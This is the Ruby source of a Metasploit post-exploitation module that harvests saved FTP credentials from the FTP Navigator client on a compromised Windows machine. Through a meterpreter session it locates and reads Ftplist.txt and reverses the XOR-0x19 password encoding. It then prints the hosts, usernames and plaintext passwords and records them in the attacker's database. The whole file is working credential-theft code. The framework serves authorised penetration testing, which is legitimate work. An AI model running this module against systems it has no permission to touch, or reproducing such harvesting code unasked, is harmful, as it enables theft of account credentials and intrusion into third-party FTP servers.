##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Windows Gather FTP Navigator Saved Password Extraction',
      'Description'    => %q{
        This module extracts saved passwords from the FTP Navigator FTP client.
        It will decode the saved passwords and store them in the database.
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['theLightCosine'],
      'Platform'       => [ 'win' ],
      'SessionTypes'   => [ 'meterpreter' ]
    ))
  end

  def run
    key = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\FTP Navigator_is1\\"
    val_name = "InstallLocation"
    installdir = registry_getvaldata(key, val_name) || "c:\\FTP Navigator\\"

    path = "#{installdir}Ftplist.txt"

    begin
      ftplist = client.fs.file.new(path,'r')
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Unable to open Ftplist.txt: #{e}")
      print_error("FTP Navigator May not Ne Installed")
      return
    end

    lines = ftplist.read.split("\n")
    lines.each do |line|
      next if line.include? "Anonymous=1"
      next unless line.include? ";Password="

      dpass    = ""
      username = ""
      server   = ""
      port     = ""

      line.split(";").each do |field|
        next if field.include? "SavePassword"

        if field.include? "Password="
          epass = split_values(field)
          dpass = decode_pass(epass)
        elsif field.include? "User="
          username = split_values(field)
        elsif field.include? "Server="
          server = split_values(field)
        elsif field.include? "Port="
          port = split_values(field)
        end
      end

      print_good("Host: #{server} Port: #{port} User: #{username} Pass: #{dpass}")
      if session.db_record
        source_id = session.db_record.id
      else
        source_id = nil
      end
      report_auth_info(
        :host  => server,
        :port => port,
        :sname => 'ftp',
        :source_id => source_id,
        :source_type => "exploit",
        :user => username,
        :pass => dpass
      )
    end
  end

  def split_values(field)
    values = field.split("=",2)
    return values[1]
  end

  def decode_pass(encoded)
    decoded = ""
    encoded.unpack("C*").each do |achar|
      decoded << (achar ^ 0x19)
    end
    return decoded
  end
end
